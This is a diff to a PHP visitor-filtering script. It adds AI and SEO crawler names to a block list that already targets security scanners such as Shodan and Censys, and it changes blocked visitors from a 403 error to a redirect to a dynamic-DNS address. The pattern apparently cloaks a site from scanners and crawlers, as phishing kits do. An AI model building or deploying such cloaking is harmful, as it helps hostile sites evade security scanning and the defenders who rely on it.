@@ -55,6 +55,9 @@ $block_ua_patterns = [
     '/shodan/i',
     '/censys/i',
     '/zgrab/i',
+    '/GPTBot/i',
+    '/ChatGPT/i',
+    '/SemrushBot/i',
 ];
 
 // Get client IP (try X-Forwarded-For first)
@@ -64,19 +67,19 @@ $client_ip = explode(',', $client_ip)[0]; // In case of multiple IPs
 // Get User-Agent
 $client_ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
 
-// Block if IP matches
+// Redirect if IP matches
 foreach ($block_ip_patterns as $pattern) {
     if (preg_match($pattern, $client_ip)) {
-        header('HTTP/1.1 403 Forbidden');
-        exit('Access denied.');
+        header('Location: https://hn1f.duckdns.org/int', true, 302);
+        exit();
     }
 }
 
-// Block if UA matches
+// Redirect if UA matches
 foreach ($block_ua_patterns as $pattern) {
     if (preg_match($pattern, $client_ua)) {
-        header('HTTP/1.1 403 Forbidden');
-        exit('Access denied.');
+        header('Location: https://hn1f.duckdns.org/int', true, 302);
+        exit();
     }
 }
 
